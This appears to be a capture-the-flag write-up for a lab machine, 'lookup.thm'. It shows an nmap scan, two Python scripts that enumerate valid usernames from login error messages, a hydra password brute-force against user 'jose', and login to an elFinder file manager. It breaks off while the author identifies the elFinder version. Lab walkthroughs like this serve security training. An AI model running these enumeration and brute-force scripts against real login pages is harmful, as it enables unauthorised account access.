# lookup
the first thing is doing an nmap scan, and found that there are some ports that are open

   
But if we look closely at the websiteâ€™s behavior, we can observe that it is possible to enumerate valid usernames based on the error we are getting from the website upon a failed login:

Trying admin:admin


Trying fig:admin


We can write a small python script that would help us enumerate valid usernames:
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
  
  
import requests
import multiprocessing

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def init_session():
    # Create a session per process for connection reuse
    global session
    session = requests.Session()

def user_check(name):
    data = {"username": name, "password": "password"}
    try:
        response = session.post(target, data=data, timeout=5)
        if "Wrong password" in response.text:
            print(f"User found: {name}")
    except requests.RequestException as e:
        print(f"[!] Error checking {name}: {e}")

if __name__ == "__main__":
    try:
        with open(username_file, 'r') as user_file:
            users = [line.strip() for line in user_file if line.strip()]

        # Use a pool of 30 processes and initialize session in each
        with multiprocessing.Pool(processes=30, initializer=init_session) as pool:
            pool.map(user_check, users)

    except FileNotFoundError:
        print(f'Error: File path {username_file} does not exist.')


Using this scripts found  some users:

   

Now lets try a brute force for user jose using hydra:
[80][http-post-form] host: lookup.thm   login: jose   password:

found one valid password for jose
Lets try login with user jose using the password that we found and we:
landed in something called “elFinder”. This looks like a file manager.

There are quite a few files here, and they all contain what seems to be passwords. Still, before we try another brute-force, let’s see if we can identify the version of elfinder:
